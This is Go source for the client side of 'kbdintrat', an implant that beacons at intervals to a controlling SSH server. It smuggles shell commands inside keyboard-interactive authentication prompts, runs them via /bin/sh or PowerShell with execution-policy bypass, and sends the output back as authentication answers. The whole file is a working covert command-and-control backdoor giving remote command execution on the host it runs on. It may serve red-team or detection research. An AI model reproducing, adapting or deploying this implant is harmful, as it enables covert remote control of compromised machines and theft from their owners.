package main

/*
 * client.go
 * Client side of kbdintrat
 * By J. Stuart McMurray
 * Created 20190825
 * Last Modified 20190825
 */

import (
	"crypto/subtle"
	"errors"
	"fmt"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

// ImplantID is the default Implant ID to use.  It is declared here so that it
// may be set at compile-time.
var ImplantID string

// IgnoreFP is the flag to not check if the server fingerprint is expected.
const IgnoreFP = "ignore"

// DoClient makes connections to the SSH server at addr every bInt.  It checks
// the fingerprint before auth.  It uses challenge-response auth to get tasking
// and return results.
func DoClient(
	id string,
	addr string,
	bInt time.Duration,
	fingerprint string,
	timeout time.Duration,
	version string,
) {
	/* Roll a client config, which does the real work */
	conf := &ssh.ClientConfig{
		// KeyExchanges is put in Client/Server configs to allow using
		// old kex algorithms.  This is for compatibility with certain
		// commercial firewalls' SSH MitM.  For security.
		Config: ssh.Config{KeyExchanges: []string{
			"curve25519-sha256@libssh.org",
			"ecdh-sha2-nistp256",
			"ecdh-sha2-nistp384",
			"ecdh-sha2-nistp521",
			"diffie-hellman-group14-sha1",
			"diffie-hellman-group1-sha1",
			"diffie-hellman-group-exchange-sha256",
			"diffie-hellman-group-exchange-sha1",
		}},
		User: id,
		Auth: []ssh.AuthMethod{
			/* We should never key anything but
			keyboard-interactive auth unless we're being MitM'd */
			ssh.PasswordCallback(
				func() (secret string, err error) {
					log.Printf(
						"Possible MitM: password " +
							"auth requested",
					)
					return "", errors.New(
						"unexpected auth request",
					)
				},
			),
			ssh.PublicKeysCallback(
				func() (signers []ssh.Signer, err error) {
					log.Printf(
						"Possible MitM: " +
							"key auth requested",
					)
					return nil, errors.New(
						"unexpected auth request",
					)
				},
			),

			/* Keyboard-interactive auth is what we expect */
			ssh.KeyboardInteractive(handleKIAuth),
		},
		HostKeyCallback: func(
			hostname string,
			remote net.Addr,
			key ssh.PublicKey,
		) error {
			/* Only check the fingerprint if we're not meant to
			ignore it */
			if IgnoreFP == fingerprint {
				return nil
			}

			/* Validate the fingerprint */
			fp := ssh.FingerprintSHA256(key)
			if 1 != subtle.ConstantTimeCompare(
				[]byte(fp),
				[]byte(fingerprint),
			) {
				return errors.New("key mismatch")
			}
			return nil
		},
		ClientVersion: version,
		Timeout:       timeout,
	}

	log.Printf("ID: %v", id)

	/* Beacon every so often */
	for {
		go connect(addr, conf, timeout)
		time.Sleep(bInt)
	}
}

/* connect connects to the server at addr and uses conf to get tasking and
return output.  It won't take longer than timeout. */
func connect(addr string, conf *ssh.ClientConfig, timeout time.Duration) {
	end := time.Now().Add(timeout)

	/* Connect to the target */
	c, err := net.DialTimeout("tcp", addr, timeout)
	if nil != err {
		log.Printf("Error connecting to %s: %v", addr, err)
		return
	}
	defer c.Close()

	/* Auth (and run tasking */
	ch := make(chan error)
	go func() {
		sc, _, _, err := ssh.NewClientConn(c, addr, conf)
		if nil != sc {
			sc.Close()
		}
		ch <- err
	}()

	/* Don't try too long */
	rem := end.Sub(time.Now()) /* How much time is left */
	if 0 > rem {
		rem = 0
	}
	select {
	case err = <-ch:
		/* Finished in time */
	case <-time.After(rem):
		/* Took too long */
		err = ErrTimeout
	}

	/* If we can't auth, likely means no tasking */
	if nil != err && ("ssh: handshake failed: ssh: unable to "+
		"authenticate, attempted methods [none keyboard-interactive], "+
		"no supported methods remain" == err.Error() ||
		"ssh: handshake failed: ssh: unable to authenticate, "+
			"attempted methods [keyboard-interactive none], no "+
			"supported methods remain" == err.Error()) {
		err = nil
	}

	if nil != err {
		log.Printf("Error: %v", err)
	}
}

/* handleKIAuth implements a keyboard-interactive auth handler which runs
tasking sent in the questions and returns the output in the answers. */
func handleKIAuth(
	user string,
	instruction string,
	questions []string,
	echos []bool,
) ([]string, error) {
	/* We should only get one question */
	if 1 != len(questions) {
		return nil, fmt.Errorf(
			"expected 1 question, got %d",
			len(questions),
		)
	}

	/* Run the "question" as tasking */
	var sh *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		sh = exec.Command(
			"powershell.exe",
			"-ep", "bypass",
			"-nop",
			"-noni",
			"-command", "-",
		)
	default:
		sh = exec.Command(
			"/bin/sh",
		)
	}
	sh.Stdin = strings.NewReader(questions[0])

	/* Get the output */
	o, err := sh.CombinedOutput()
	if nil != err {
		log.Printf(
			"Error running %v-byte tasking: %v",
			len(questions[0]),
			err,
		)
		if 0 != len(o) {
			o = append(o, '\n')
		}
		o = append(o, err.Error()...)
	}

	log.Printf(
		"Got %d bytes of tasking and sent %d bytes back",
		len(questions[0]),
		len(o),
	)

	/* Send the output back */
	return []string{string(o)}, nil
}
